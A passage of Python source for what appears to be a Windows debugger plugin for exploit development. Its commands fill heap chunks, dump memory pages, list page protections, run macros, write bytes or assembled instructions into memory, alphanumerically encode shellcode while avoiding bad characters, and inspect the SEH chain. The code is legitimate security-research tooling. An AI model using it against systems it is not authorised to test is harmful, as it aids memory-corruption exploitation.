	origreference = ""

	deref = False
	refvalue = 0
	offset = 0
	signstuff = 1
	customsize = 0

	if "s" in args:
		if type(args["s"]).__name__.lower() != "bool":
			sizearg = args["s"]
			if sizearg.lower().startswith("0x"):
				sizearg = sizearg.lower().replace("0x","")
				customsize = int(sizearg,16)
			else:
				customsize = int(sizearg)

	if "a" in args:
		if type(args["a"]).__name__.lower() != "bool":
			refvalue,addyok = getAddyArg(args["a"])
			if not addyok:
				dbg.log("%s is an invalid address" % args["a"], highlight=1)
				return
		else:
			dbg.log("Please specify a valid address/register with -a", highlight=1)
			return
	else:
		dbg.log("Please specify a chunk address/register with -a", highlight=1)
		return

	dbg.log("Location: %s" % (PTR_PRINT % refvalue))

	if "b" in args:
		if type(args["b"]).__name__.lower() != "bool":
			if args["b"].find("\\x") > -1:
				fillchar = hex2bin(args["b"])[0]
			else:
				fillchar = args["b"][0]

	dbg.log("Fill char : \\x%s" % bin2hex(fillchar))
	dbg.log("")
	dbg.log("[+] Attempting to identify heap chunk details...")

	def _fillChunkFromMnProcMap():
		try:
			_ensureMnProc(
				entities=["heaps", "defaultheap", "ntheapdetail", "chunks"],
			)
		except:
			return False

		if mnproc is None:
			return False

		# 1) Use MnProc's unified range map to identify the chunk range quickly.
		chunk_start = 0
		chunk_end = 0
		for region in mnproc.getAllSorted():
			if len(region) < 4:
				continue
			start, end, category, description = region[:4]
			if category == "Heap Chunk" and refvalue >= start and refvalue < end:
				chunk_start = start
				chunk_end = end
				break

		if chunk_start == 0:
			return False

		# 2) Find owning segment range and resolve precise MnChunk object.
		for heapaddr, detail in mnproc.ntheapdetail.items():
			segments = detail.get("segments", {})
			for segaddr, seg in segments.items():
				if chunk_start < seg.get("base", 0) or chunk_start >= seg.get("end", 0):
					continue
				try:
					allchunks = walkSegment(seg["firstentry"], seg["lastentry"], heapaddr)
				except:
					allchunks = {}

				matched_chunk = None
				if chunk_start in allchunks:
					matched_chunk = allchunks[chunk_start]
				else:
					for chunkaddr, mchunk in allchunks.items():
						chunksize = mchunk.size * heapgranularity
						if chunk_start >= chunkaddr and chunk_start < (chunkaddr + chunksize):
							matched_chunk = mchunk
							break

				if matched_chunk is not None and matched_chunk.usersize > 0:
					dbg.log("[+] Heap chunk found at %s, size 0x%08x (%d) bytes [MnProc ranges]" % (
						(PTR_PRINT % matched_chunk.chunkptr), matched_chunk.usersize, matched_chunk.usersize))
					dbg.log("[+] Filling chunk with \\x%s, starting at %s" % (
						bin2hex(fillchar), (PTR_PRINT % matched_chunk.userptr)))
					matched_chunk.fill(fillchar)
					dbg.log("[+] Done")
					return True
		return False

	def _fillChunkFromHeapXFallback():
		def _cleanHexDword(token):
			token = token.strip()
			token = token.replace("`", "")
			token = token.replace("[", "")
			token = token.replace("]", "")
			token = token.replace("(", "")
			token = token.replace(")", "")
			token = token.replace(",", "")
			token = token.replace("0x", "")
			return token

		cmd2run = "!heap -x %s" % (PTR_PRINT % refvalue)
		output = dbg.nativeCommand(cmd2run)
		outputlines = output.split("\n")
		heapinfo = ""
		for line in outputlines:
			if line.find("[") > -1 and line.find("]") > -1 and line.find("(") > -1 and line.find(")") > -1:
				heapinfo = line
				break
		if heapinfo == "":
			dbg.log("Address is not part of a heap chunk")
			if customsize > 0:
				dbg.log("Filling memory location starting at %s with \\x%s" % ((PTR_PRINT % refvalue),bin2hex(fillchar)))
				dbg.log("Number of bytes to write : %d (0x%08x)" % (customsize,customsize))
				fillbyte = _normalize_single_fill_byte(fillchar)
				if len(fillbyte) == 0:
					dbg.log("Invalid fill byte specified", highlight=1)
					return False
				data = fillbyte * customsize
				dbg.writeMemory(refvalue,data)
				dbg.log("Done")
				return True
			dbg.log("Please specify a custom size with -s to fill up the memory location anyway")
			return False

		infofields = []
		cnt = 0
		charseen = False
		thisfield = ""
		while cnt < len(heapinfo):
			if heapinfo[cnt] == " " and charseen and thisfield != "":
				infofields.append(thisfield)
				thisfield = ""
			else:
				if not heapinfo[cnt] == " ":
					thisfield += heapinfo[cnt]
					charseen = True
			cnt += 1
		if thisfield != "":
			infofields.append(thisfield)
		if len(infofields) > 7:
			chunkptr = hexStrToInt(_cleanHexDword(infofields[0]))
			userptr = hexStrToInt(_cleanHexDword(infofields[4]))
			size = hexStrToInt(_cleanHexDword(infofields[5]))
			if chunkptr == 0 or userptr == 0 or size == 0:
				dbg.log("Unable to parse heap chunk details from '!heap -x' output", highlight=1)
				return False
			dbg.log("Heap chunk found at %s, size 0x%08x (%d) bytes" % ((PTR_PRINT % chunkptr),size,size))
			dbg.log("Filling chunk with \\x%s, starting at %s" % (bin2hex(fillchar),(PTR_PRINT % userptr)))
			fillbyte = _normalize_single_fill_byte(fillchar)
			if len(fillbyte) == 0:
				dbg.log("Invalid fill byte specified", highlight=1)
				return False
			data = fillbyte * size
			dbg.writeMemory(userptr,data)
			dbg.log("Done")
			return True

		dbg.log("Unable to locate heap chunk metadata in '!heap -x' output", highlight=1)
		return False

	if _fillChunkFromMnProcMap():
		return

	_fillChunkFromHeapXFallback()
	return

def procInfoDump(args):
	allpages = dbg.getMemoryPages()
	filename = "infodump.xml"
	xmldata = '<info>\n'
	xmldata += "<modules>\n"
	populateModuleInfo()
	modulestoquery=[]
	for thismodule,modproperties in mnproc.g_modules.items():
		xmldata += "  <module name='%s'>\n" % thismodule
		thisbase = getModuleProperty(thismodule,"base")
		thissize = getModuleProperty(thismodule,"size")
		xmldata += "    <base>%s</base>\n" % (PTR_PRINT % thisbase)
		xmldata += "    <size>%s</size>\n" % (PTR_PRINT % thissize)
		xmldata += "  </module>\n"
	xmldata += "</modules>\n"
	orderedpages = []
	for tpage in allpages.keys():
		orderedpages.append(tpage)
	orderedpages.sort()
	if len(orderedpages) > 0:
		xmldata += "<pages>\n"				
		# first dump module info to file
		objfile = MnLog(filename, numbered = True)
		infofile = objfile.reset(clear=True,showheader=False,skipModuleTable=True)
		f = open(infofile,"w")
		for line in xmldata.split("\n"):
			if line != "":
				f.write(line + "\n")
		dbg.log("")
		tolog = "Dumping the following pages to file:"
		dbg.log(tolog)
		dbg.log("")
		# PTR_SIZE is in bytes; for display we want the length of a rendered pointer (e.g. "0x%08x").
		fieldsize = len(PTR_PRINT % 0)
		fmt = "%%-%ds  %%-%ds  %%-%ds  %%-%ds" % (fieldsize, fieldsize, 8 , fieldsize)
		header = fmt % ("Start", "End", "Size", "ACL")
		separator = fmt % ("-" * fieldsize, "-" * fieldsize, "-" * 8, "-" * fieldsize)
		dbg.log(header)
		dbg.log(separator)
		for thispage in orderedpages:
			page = allpages[thispage]
			pagestart = page.getBaseAddress()
			pagesize = page.getSize()
			ptr = MnPointer(pagestart)
			mod = ""
			sectionname = ""
			ismod = False
			isstack = False
			isheap = False
			try:
				mod = ptr.belongsTo()
				if mod != "":
					ismod = True
			except:
				mod = ""
			if not ismod:
				if ptr.isOnStack():
					isstack = True
			if not ismod and not isstack:
				if ptr.isInHeap():
					isheap = True
			if not ismod and not isstack and not isheap:
				acl = page.getAccess(human=True)
				if not "NOACCESS" in acl:
					fmt = "%%-%ds  %%-%ds  %%-%ds  %%-%ds" % (fieldsize, fieldsize, 8, fieldsize)
					tolog = fmt % (PTR_PRINT % pagestart, PTR_PRINT % (pagestart + pagesize), "0x%x" % (pagesize), acl)
					dbg.log(tolog)
					# add page contents to xml
					thispage = dbg.readMemory(pagestart,pagesize)
					f.write("  <page start=\"%s\">\n" % (PTR_PRINT % pagestart))
					f.write("    <size>0x%x</size>\n" % (pagesize))
					f.write("    <acl>%s</acl>\n" % acl)
					f.write("    <contents>")
					memcontents = bin2hex(thispage)
					f.write(memcontents)
					f.write("</contents>\n")
					f.write("  </page>\n")
		f.write("</pages>\n")
		f.write("</info>")
		dbg.log("")
		f.close()
		dbg.log("Done.  Memory contents written to %s" % infofile)
	return


def procPEB(args):
	"""
	Show the address of the PEB
	"""
	pebaddy = MnPEB.get_address()
	dbg.log("PEB is located at " + PTR_PRINT % pebaddy, address=pebaddy)
	return

def procTEB(args):
	"""
	Show the address of the TEB for the current thread
	"""
	tebaddy = get_teb_addr()
	dbg.log("TEB is located at " + PTR_PRINT % tebaddy, address=tebaddy)
	return

def procPageACL(args):
	global silent
	global MemoryPageACL
	silent = True
	findaddy = 0
	aclfilter = ""
	aclfilter_val = None
	modifier_only_acl_vals = [0x100, 0x200, 0x400]
	if "a" in args:
		findaddy,addyok = getAddyArg(args["a"])
		if not addyok:
			dbg.log("%s is an invalid address" % args["a"], highlight=1)
			return
	if "acl" in args:
		if type(args["acl"]).__name__.lower() != "bool":
			candidate_acl = args["acl"].upper()
			if candidate_acl in MnProc.memProtConstants:
				aclfilter = candidate_acl
				aclfilter_val = MnProc.memProtConstants[candidate_acl][1]
			else:
				dbg.log(" *** Please specify a valid memory protection constant with -acl ***")
				dbg.log(" *** Valid values are :")
				for acltype in MnProc.memProtConstants:
					dbg.log("     %s (%s = 0x%02x)" % (toSize(acltype,10),MnProc.memProtConstants[acltype][0],MnProc.memProtConstants[acltype][1]))
				return
	if findaddy > 0:
		dbg.log("Displaying page information around address 0x%08x" % findaddy)
	# Force a fresh memory map snapshot for each pageacl invocation.
	# This avoids stale output after allocmem/changeacl commands.
	try:
		dbg.MemoryPages = {}
	except:
		pass
	MemoryPageACL = {}
	allpages = dbg.getMemoryPages()
	dbg.log("Total of %d pages : "% len(allpages))
	filename="pageacl.txt"
	orderedpages = []
	for tpage in allpages.keys():
		orderedpages.append(tpage)
	orderedpages.sort()
	# find indexes to show in case we have specified an address
	toshow = []
	if findaddy > 0:
		for idx, thispage in enumerate(orderedpages):
			page = allpages[thispage]
			pagestart = page.getBaseAddress()
			pagesize = page.getSize()
			pageend = pagestart + pagesize
			if findaddy >= pagestart and findaddy < pageend:
				# add previous page (if any)
				if idx - 1 >= 0:
					toshow.append(orderedpages[idx - 1])
				# add current page
				toshow.append(thispage)
				# add next page (if any)
				if idx + 1 < len(orderedpages):
					toshow.append(orderedpages[idx + 1])
				break
	if len(toshow) > 0:
		toshow.sort()
		orderedpages = toshow
		dbg.log("Showing %d pages" % len(orderedpages))
	if aclfilter != "":
		dbg.log("Filtering pages with ACL: %s" % MnProc.memProtConstants[aclfilter][0])
	if len(orderedpages) > 0:
		# Pre-build lookup tables to avoid per-page MnPointer/belongsTo overhead
		_ensureMnProc(entities=["modules", "vacache"])
		mod_ranges = []
		for modname, modprops in mnproc.g_modules.items():
			mod_ranges.append((modprops["base"], modprops["top"], modname))
		mod_ranges.sort()

		stacks = getStacks()

		objfile = MnLog(filename)
		aclfile = objfile.reset()
		addr_width = 10
		if arch == 64:
			addr_width = 18   # "0x" + 16 hex chars
			size_width = addr_width - 2
		else:
			size_width = addr_width
		acl_width = 25
		# Left aligned / Left aligned / left aligned, left aligned 
		fmt = "%%-%ds  %%-%ds  %%-%ds  %%-%ds %%s" % (addr_width, addr_width, size_width, acl_width)
		tolog = fmt % ("Start","End","Size","ACL", "Info")
		dbg.log(tolog)
		objfile.write(tolog,aclfile)

		tolog = fmt % ("-" * addr_width,"-" * addr_width, "-" * size_width,"-" * acl_width, "-" * 30)
		dbg.log(tolog)
		objfile.write(tolog,aclfile)


		for thispage in orderedpages:
			page = allpages[thispage]
			pagestart = page.getBaseAddress()
			pagesize = page.getSize()
			pageusage = ""
			if __DEBUGGERAPP__ == "WinDBG":
				pageusage = page.getUsage().strip()
			mod = ""
			sectionname = ""
			# Check modules via pre-built sorted list (no MnPointer needed)
			for modbase, modtop, modname in mod_ranges:
				if modbase > pagestart:
					break
				if pagestart >= modbase and pagestart <= modtop:
					mod = clickModuleName(modname)
					try:
						sectionname = page.getSection().strip()
					except:
						pass
					break
			if mod == "":
				# Check stacks
				on_stack = False
				for stack in stacks:
					if stacks[stack][0] <= pagestart < stacks[stack][1]:
						on_stack = True
						break
				if on_stack:
					if "Stack" not in pageusage:
						mod = "(Stack)"
				else:
					# Check heap segments
					in_heap = False
					owner = ""
					for heap, segstart, seglast in mnproc.VACache["segments"]:
						if pagestart >= heap and pagestart <= seglast:
							in_heap = True
							owner = clickSegmentWinDBG(segstart, "nt", "Heap Segment")
							break
					if not in_heap:
						for vastart, vaend in mnproc.VACache["vablocks"]:
							if pagestart >= vastart and pagestart <= vaend:
								in_heap = True
								owner = "VirtualAllocdBlock"
								break
					if in_heap and "Heap" not in pageusage:
						mod = "(%s)" % owner
			acl_num = page.getAccess()
			if aclfilter_val != None:
				if aclfilter_val in modifier_only_acl_vals:
					if (acl_num & aclfilter_val) != aclfilter_val:
						continue
				else:
					if acl_num != aclfilter_val:
						continue
			acl = page.getAccess(human=True)
			tolog = ""
			pusage = ""
			if len(mod) > 0:
				if not mod in pageusage and len(mod) > 1:
					pusage += "%s %s " % (mod, sectionname)
				else:
					pusage += "%s " % (sectionname)
			pusage += "%s" % pageusage

			pstart = "%s" % PTR_PRINT % pagestart
			pend = "%s" % PTR_PRINT % (pagestart + pagesize)
			psize = "0x%x" % pagesize
				
			tolog = fmt % (pstart, pend, psize, acl, pusage.strip())

			objfile.write(tolog,aclfile)
			dbg.log(tolog)
	silent = False
	return

def procMacro(args):
	validcommands = ["run","set","list","del","add","show"]
	validcommandfound = False
	selectedcommand = ""
	for command in validcommands:
		if command in args:
			validcommandfound = True
			selectedcommand = command
			break
	dbg.log("")
	if not validcommandfound:
		dbg.log("*** Please specify a valid command. Valid commands are :")
		for command in validcommands:
			dbg.log("    -%s" % command)
		return			

	macroname = ""
	if "set" in args:
		if type(args["set"]).__name__.lower() != "bool":
			macroname = args["set"]

	if "show" in args:
		if type(args["show"]).__name__.lower() != "bool":
			macroname = args["show"]

	if "add" in args:
		if type(args["add"]).__name__.lower() != "bool":
			macroname = args["add"]				

	if "del" in args:
		if type(args["del"]).__name__.lower() != "bool":
			macroname = args["del"]	

	if "run" in args:
		if type(args["run"]).__name__.lower() != "bool":
			macroname = args["run"]	

	filename = ""
	index = -1
	insert = False
	iamsure = False
	if "index" in args:
		if type(args["index"]).__name__.lower() != "bool":
			index = int(args["index"])
			if index < 0:
				dbg.log("** Please use a positive integer as index",highlight=1)

	if "file" in args:
		if type(args["file"]).__name__.lower() != "bool":
			filename = args["file"]

	if filename != "" and index > -1:
		dbg.log("** Please either provide an index or a filename, not both",highlight=1)
		return

	if "insert" in args:
		insert = True

	if "iamsure" in args:
		iamsure = True

	argcommand = ""
	if "cmd" in args:
		if type(args["cmd"]).__name__.lower() != "bool":
			argcommand = args["cmd"]


	dbg.setKBDB("monamacro.db")
	macros = dbg.getKnowledge("macro")
	if macros is None:
		macros = {}

	if selectedcommand == "list":
		for macro in macros:
			thismacro = macros[macro]
			macronametxt = "Macro : '%s' : %d command(s)" % (macro,len(thismacro))
			dbg.log(macronametxt)
		dbg.log("")
		dbg.log("Number of macros : %d" % len(macros))

	if selectedcommand == "show":
		if macroname != "":
			if not macroname in macros:
				dbg.log("** Macro %s does not exist !" % macroname)
				return
			else:
				macro = macros[macroname]
				macronametxt = "Macro : %s" % macroname
				macroline = "-" * len(macronametxt)
				dbg.log(macronametxt)
				dbg.log(macroline)
				thismacro = macro
				macrolist = []
				for macroid in thismacro:
					macrolist.append(macroid)
				macrolist.sort()
				nr_of_commands = 0
				for macroid in macrolist:
					macrocmd = thismacro[macroid]
					if macrocmd.startswith("#"):
						dbg.log("   [%04d] File:%s" % (macroid,macrocmd[1:]))
					else:
						dbg.log("   [%04d] %s" % (macroid,macrocmd))
					nr_of_commands += 1
				dbg.log("")
				dbg.log("Nr of commands in this macro : %d" % nr_of_commands)
		else:
			dbg.log("** Please specify the macroname to show !",highlight=1)
			return					

	if selectedcommand == "run":
		if macroname != "":
			if not macroname in macros:
				dbg.log("** Macro %s does not exist !" % macroname)
				return
			else:
				macro = macros[macroname]
				macronametxt = "Running macro : %s" % macroname
				macroline = "-" * len(macronametxt)
				dbg.log(macronametxt)
				dbg.log(macroline)
				thismacro = macro
				macrolist = []
				for macroid in thismacro:
					macrolist.append(macroid)
				macrolist.sort()
				for macroid in macrolist:
					macrocmd = thismacro[macroid]
					if macrocmd.startswith("#"):
						dbg.log("Executing script %s" % macrocmd[1:])
						output = dbg.nativeCommand("$<%s" % macrocmd[1:])
						dbg.logLines(output)
						dbg.log("-" * 40)
					else:
						dbg.log("Index %d : %s" % (macroid,macrocmd))
						dbg.log("")
						output = dbg.nativeCommand(macrocmd)
						dbg.logLines(output)
						dbg.log("-" * 40)
				dbg.log("")
				dbg.log("[+] Done.")
		else:
			dbg.log("** Please specify the macroname to run !",highlight=1)
			return	

	if selectedcommand == "set":
		if macroname != "":
			if not macroname in macros:
				dbg.log("** Macro %s does not exist !" % macroname)
				return
			if argcommand == "" and filename == "":
				dbg.log("** Please enter a valid command with parameter -cmd",highlight=1)
				return
			thismacro = macros[macroname]
			if index == -1:
				for i in thismacro:
					thiscmd = thismacro[i]
					if thiscmd.startswith("#"):
						dbg.log("** You cannot edit a macro that uses a scriptfile.",highlight=1)
						dbg.log("   Edit file %s instead" % thiscmd[1:],highlight=1)
						return						
				if filename == "":
					# append to end of the list
					# find the next index first
					nextindex = 0
					for macindex in thismacro:
						if macindex >= nextindex:
							nextindex = macindex+1
					if thismacro.__class__.__name__ == "dict":
						thismacro[nextindex] = argcommand
					else:
						thismacro = {}
						thismacro[nextindex] = argcommand
				else:
					thismacro = {}
					nextindex = 0
					thismacro[0] = "#%s" % filename
				macros[macroname] = thismacro
				dbg.addKnowledge("macro",macros)
				dbg.log("[+] Done, saved new command at index %d." % nextindex)
			else:
				# user has specified an index
				if index in thismacro:
					if argcommand == "#":
						# remove command at this index
						del thismacro[index]
					else:
						# if macro already contains a file entry, bail out
						for i in thismacro:
							thiscmd = thismacro[i]
							if thiscmd.startswith("#"):
								dbg.log("** You cannot edit a macro that uses a scriptfile.",highlight=1)
								dbg.log("   Edit file %s instead" % thiscmd[1:],highlight=1)
								return
						# index exists - overwrite unless -insert was provided too
						# remove or insert ?
						#print sys.argv
						if not insert:
							thismacro[index] = argcommand
						else:
							# move things around
							# get ordered list of existing indexes
							indexes = []
							for macindex in thismacro:
								indexes.append(macindex)
							indexes.sort()
							thismacro2 = {}
							cmdadded = False
							for i in indexes:
								if i < index:
									thismacro2[i] = thismacro[i]
								elif i == index:
									thismacro2[i] = argcommand
									thismacro2[i+1] = thismacro[i]
								elif i > index:
									thismacro2[i+1] = thismacro[i]
							thismacro = thismacro2
				else:
					# index does not exist, add new command to this index
					for i in thismacro:
						thiscmd = thismacro[i]
						if thiscmd.startswith("#"):
							dbg.log("** You cannot edit a macro that uses a scriptfile.",highlight=1)
							dbg.log("   Edit file %s instead" % thiscmd[1:],highlight=1)
							return							
					if argcommand != "#":
						thismacro[index] = argcommand
					else:
						dbg.log("** Index %d does not exist, unable to remove the command at that position" % index,highlight=1)
				macros[macroname] = thismacro
				dbg.addKnowledge("macro",macros)
				if argcommand != "#":
					dbg.log("[+] Done, saved new command at index %d." % index)
				else:
					dbg.log("[+] Done, removed command at index %d." % index)
		else:
			dbg.log("** Please specify the macroname to edit !",highlight=1)
			return

	if selectedcommand == "add":
		if macroname != "":
			if macroname in macros:
				dbg.log("** Macro '%s' already exists !" % macroname,highlight=1)
				return
			else:
				macros[macroname] = {}
				dbg.log("[+] Adding macro '%s'" % macroname)
				dbg.addKnowledge("macro",macros)
				dbg.log("[+] Done.")
		else:
			dbg.log("** Please specify the macroname to add !",highlight=1)
			return


	if selectedcommand == "del":
		if not macroname in macros:
			dbg.log("** Macro '%s' doesn't exist !" % macroname,highlight=1)
		else:
			if not iamsure:
				dbg.log("** To delete macro '%s', please add the -iamsure flag to the command" % macroname)
				return
			else:
				dbg.forgetKnowledge("macro",macroname)
				dbg.log("[+] Done, deleted macro '%s'" % macroname)
	return

def procWrite(args):
	"""
	Write bytes to a destination address
	"""
	targetloc = 0
	addyok = False
	byteerror = True
	bytestocopy = b""

	if "a" in args and type(args["a"]).__name__.lower() != "bool":
		targetloc, addyok = getAddyArg(args["a"])

	if not addyok:
		dbg.log("** Please provide a valid address with -a **", highlight = True)

	if "s" in args:
		if type(args["s"]).__name__.lower() != "bool":
			# -s can be bytes (\\xNN...) or assembly (instr#instr#...)
			raw_s = args["s"]
			normalized = normalizeHexBytesArg(raw_s)
			if normalized is not None and normalized != "":
				bytestocopystr = normalized
				s_input_type = "bytes"
			else:
				s_input_asm = raw_s
				s_input_type = "asm"
			byteerror = False

	if byteerror:
		dbg.log("** Please provide bytes or assembly with argument -s **", highlight = True)

	if byteerror or not addyok:
		return

	if bytestocopy == "" and s_input_asm == "":
			byteerror = True
	else:
		try:
			if s_input_type == "asm" and s_input_asm != "":
				#checkKeystone()
				asmtext = _to_text(s_input_asm).replace('"', "").replace("'", "")
				asmparts = [p.strip() for p in re.split(r'[;#]', asmtext) if p and p.strip()]
				if len(asmparts) == 0:
					byteerror = True
				else:
					dbgp("[+] Assembling the following instructions:\n%s" % "\n".join(asmparts))
					asmjoined = "\n".join(asmparts)
					assembled = dbg.assemble(asmjoined)
					dbgp("[+] Assembled bytes: %s" % bin2hex(assembled))
					dbg.log("[+] Assembled the instruction to %s" % bin2hexstr(assembled))
					# dbg.assemble should return raw bytes (py3) or str (py2). Coerce for safety.
					if isinstance(assembled, bytearray):
						assembled = bytes(assembled) if PY3 else ''.join(chr(b & 0xff) for b in assembled)
					elif PY3 and isinstance(assembled, (list, tuple)):
						assembled = bytes([b & 0xff for b in assembled])
					bytestocopy = _to_bytes(assembled)
					byteerror = (bytestocopy == b"")
			else:
				normalized = normalizeHexBytesArg(bytestocopystr)
				if normalized is None or normalized == "":
					byteerror = True
				else:
					bytestocopy = hex2bin(normalized)
					byteerror = False
		except:
			byteerror = True

	if len(bytestocopy) > 0:
		# copy the bytes
		dbg.log("[+] Writing %d bytes to %s" % (len(bytestocopy), PTR_PRINT % targetloc))
		dbg.writeMemory(targetloc, bytestocopy)
		dbg.log("[+] Done")
	return

def procEnc(args):
	validencoders = ['alphanum']
	encodertyperror = True
	byteerror = True
	encodertype = ""
	bytestoencodestr = ""
	bytestoencode = b""
	s_input_type = ""  # "bytes" or "asm"
	s_input_asm = ""
	badbytes = ""
	
	if "t" in args:
		if type(args["t"]).__name__.lower() != "bool":
			encodertype = args["t"]
			encodertyperror = False

	if "s" in args:
		if type(args["s"]).__name__.lower() != "bool":
			# -s can be bytes (\\xNN...) or assembly (instr#instr#...)
			raw_s = args["s"]
			normalized = normalizeHexBytesArg(raw_s)
			if normalized is not None and normalized != "":
				bytestoencodestr = normalized
				s_input_type = "bytes"
			else:
				s_input_asm = raw_s
				s_input_type = "asm"
			byteerror = False

	if "f" in args:
		if type(args["f"]).__name__.lower() != "bool":
			binfile = getAbsolutePath(args["f"])
			if os.path.exists(binfile):
				if not silent:
					dbg.log("[+] Reading bytes from %s" % binfile)
				filebytes = fileToBin(binfile)
				if len(filebytes) > 0:
					bytestoencodestr = ''.join("%02x" % b for b in filebytes)
					s_input_type = "bytes"
					byteerror = False
				else:
					# Distinguish unreadable file from empty file while preserving old behavior.
					try:
						if os.path.getsize(binfile) > 0:
							dbg.log("*** Error - unable to read bytes from %s" % binfile)
							byteerror = True
						else:
							s_input_type = "bytes"
							byteerror = False
					except:
						dbg.log("*** Error - unable to read bytes from %s" % binfile)
						dbg.logLines(traceback.format_exc(),highlight=True)
						byteerror = True
			else:
				byteerror = True
		else:
			byteerror = True

	if "cpb" in args:
		if type(args["cpb"]).__name__.lower() != "bool":
			badbytes = hex2bin(args["cpb"])

	if not encodertype in validencoders:
		encodertyperror = True

	if bytestoencodestr == "" and s_input_asm == "":
		byteerror = True
	else:
		try:
			if s_input_type == "asm" and s_input_asm != "":
				#checkKeystone()
				asmtext = _to_text(s_input_asm).replace('"', "").replace("'", "")
				asmparts = [p.strip() for p in re.split(r'[;#]', asmtext) if p and p.strip()]
				if len(asmparts) == 0:
					byteerror = True
				else:
					dbgp("[+] Assembling the following instructions:\n%s" % "\n".join(asmparts))
					asmjoined = "\n".join(asmparts)
					assembled = dbg.assemble(asmjoined)
					dbgp("[+] Assembled bytes: %s" % bin2hex(assembled))
					# dbg.assemble should return raw bytes (py3) or str (py2). Coerce for safety.
					if isinstance(assembled, bytearray):
						assembled = bytes(assembled) if PY3 else ''.join(chr(b & 0xff) for b in assembled)
					elif PY3 and isinstance(assembled, (list, tuple)):
						assembled = bytes([b & 0xff for b in assembled])
					bytestoencode = _to_bytes(assembled)
					byteerror = (bytestoencode == b"")
			else:
				normalized = normalizeHexBytesArg(bytestoencodestr)
				if normalized is None or normalized == "":
					byteerror = True
				else:
					bytestoencode = hex2bin(normalized)
					byteerror = False
		except:
			byteerror = True

	if encodertyperror:
		dbg.log("*** Please specific a valid encodertype with parameter -t.",highlight=True)
		dbg.log("*** Valid types are: %s" % validencoders,highlight=True)


	if byteerror:
		dbg.log("*** Please specify a valid series of bytes with parameter -s",highlight=True)
		dbg.log("*** or specify assembly instructions with parameter -s (use # to separate instructions)",highlight=True)
		dbg.log("*** or specify a valid path with parameter -f",highlight=True)

	if encodertyperror or byteerror:
		return
	else:
		cEncoder = MnEncoder(bytestoencode)
		encodedbytes = ""
		if encodertype == "alphanum":
			encodedbytes = cEncoder.encodeAlphaNum(badchars = badbytes)
			# determine correct sequence of dictionary
			if len(encodedbytes) > 0:
				logfile = MnLog("encoded_%s.txt" % encodertype)
				thislog = logfile.reset(skipModuleTable=True)
				if not silent:
					dbg.log("")
					dbg.log("Results:")
					dbg.log("--------")
				logfile.write("",thislog)
				logfile.write("Results:",thislog)
				logfile.write("--------",thislog)
				encodedindex = []
				fulllist_str = ""
				fulllist_bin = b""
				for i in encodedbytes:
					encodedindex.append(i)
				for i in encodedindex:
					thisline = encodedbytes[i]
					# 0 = bytes
					# 1 = info
					thislinebytes = "\\x" + "\\x".join(bin2hex(thisline[0]).split(" "))
					logline = "  %s : %s : %s" % (thisline[0],thislinebytes,thisline[1])
					if not silent:
						dbg.log("%s" % logline)
					logfile.write(logline,thislog)
					fulllist_str += thislinebytes
					fulllist_bin += thisline[0]

				if not silent:
					dbg.log("")
					dbg.log("Full encoded string:")
					dbg.log("--------------------")
					dbg.log("%s" % fulllist_bin)
				logfile.write("",thislog)
				logfile.write("Full encoded string:",thislog)
				logfile.write("--------------------",thislog)
				logfile.write("%s" % fulllist_bin,thislog)
				logfile.write("",thislog)
				logfile.write("Full encoded hex:",thislog)
				logfile.write("-----------------",thislog)
				logfile.write("%s" % fulllist_str,thislog)
	return

def procString(args):
	mode = ""
	useunicode = False
	terminatestring = True
	addy = 0
	regs = getRegisters()
	stringtowrite = ""
	# read or write ?
	if not "r" in args and not "w" in args:
		dbg.log("[+] Default mode is read (-r)")     
		dbg.log("    Use -w if you would like to write instead")
		dbg.log("")
		#dbg.log("*** Error: you must indicate if you want to read (-r) or write (-w) ***",highlight=True)
		mode = "read"

	addresserror = False
	if not "a" in args:
		addresserror = True
	else:
		if type(args["a"]).__name__.lower() != "bool":
			# check if it's a register or not
			if str(args["a"]).lower() in regs:
				addy = regs[str(args["a"].lower())]
			else:
				addy = int(args["a"],16)
		else:
			addresserror = True

	if addresserror:
		dbg.log("*** Error: you must specify a valid address with -a ***",highlight=True)
		return

	if mode == "":
		if "w" in args:
			mode = "write"
		if "r" in args:
			# read wins, because it's non destructive
			mode = "read"
	if "u" in args:
		useunicode = True

	stringerror = False
	if "w" in args and not "s" in args:
		stringerror = True
	if "s" in args:
		if type(args["s"]).__name__.lower() != "bool":
			stringtowrite = args["s"]
		else:
			stringerror = True

	if "noterminate" in args:
		terminatestring = False

	if stringerror:
		dbg.log("*** Error: you must specify a valid string with -s ***",highlight=True)
		return

	if mode == "read":
		stringinmemory = ""
		extra = " "
		try:
			if not useunicode:
				stringinmemory = dbg.readString(addy)
			else:
				stringinmemory = dbg.readWString(addy)
				extra = " (unicode) "
			dbg.log("String%sat 0x%08x:" % (extra,addy))
			dbg.log("%s" % stringinmemory)
		except:
			dbg.log("Unable to read string at 0x%08x" % addy)
	if mode == "write":
		origstring = stringtowrite
		writtendata = ""
		try:
			if not useunicode:
				if terminatestring:
					stringtowrite += "\x00"
				byteswritten = ""
				for c in stringtowrite:
					byteswritten += " %s" % bin2hex(c)
				dbg.writeMemory(addy,stringtowrite)
				writtendata = dbg.readString(addy)
				dbg.log("Wrote string (%d bytes) to 0x%08x:" % (len(stringtowrite),addy))
				dbg.log("%s" % byteswritten)
			else:
				newstring = ""
				for c in stringtowrite:
					newstring += "%s%s" % (c,"\x00")
				if terminatestring:
					newstring += "\x00\x00"
				dbg.writeMemory(addy,newstring)
				dbg.log("Wrote unicode string (%d bytes) to 0x%08x" % (len(newstring),addy))
				writtendata = dbg.readWString(addy)
				byteswritten = ""
				for c in newstring:
					byteswritten += " %s" % bin2hex(c)
				dbg.log("%s" % byteswritten)
			if not writtendata.startswith(origstring):
				dbg.log("Write operation succeeded, but the string in memory doesn't appear to be there",highlight=True)
		except:
			dbg.log("Unable to write the string to 0x%08x" % addy)	
			dbg.logLines(traceback.format_exc(),highlight=True)			
	return

def procBPSeh(self):
	sehchain = dbg.getSehChain()
	dbg.log("Nr of SEH records : %d" % len(sehchain))
	dict_sehrecords = {}
	sehseq = []
	dbg.log("")
	dbg.log("SEH Chain :")
	dbg.log("")
	headers = ["On Stack", "Next SEH", "SE Handler", "Function", "Action"]
	types   = ["pointer", "pointer", "pointer", "string", "string"]

	if len(sehchain) > 0:
		for sehrecord in sehchain:
			address = sehrecord[0]
			sehandler = sehrecord[1]
			nseh = ""
			nsehvalue = 0
			try:
				nsehvalue = struct.unpack('<L',dbg.readMemory(address,4))[0]
			except:
				nsehvalue = 0
			bpsuccess = True
			try:
				if __DEBUGGERAPP__ == "WinDBG":
					bpsuccess = dbg.setBreakpoint(sehandler)
				else:
